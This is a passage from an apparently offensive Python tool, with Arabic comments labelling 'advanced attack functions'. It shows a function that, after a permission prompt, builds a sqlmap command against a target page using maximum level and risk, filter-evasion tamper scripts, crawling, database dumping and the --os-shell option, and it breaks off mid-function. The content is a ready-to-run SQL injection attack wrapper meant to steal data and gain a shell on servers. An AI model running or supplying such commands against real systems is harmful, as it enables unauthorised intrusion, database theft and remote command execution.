...
# ============================
# وظائف الهجمات المتقدمة
# ============================

def run_sqlmap(target):
    """
    تنفيذ SQLMap مع أساليب هجومية.
    """
    if not request_permission("SQLMap", "Run SQL Injection attack?"):
        return
    try:
        command = [
            "sqlmap", "-u", f"http://{target}/vulnerable_page.php?id=1", "--batch", "--level=5", "--risk=3",
            "--tamper=space2comment,charencode,randomcase,between", "--random-agent", "--crawl=5", "--threads=10",
            "--technique=BEUSTQ", "--dump", "--forms", "--dbs", "--os-shell"
        ]
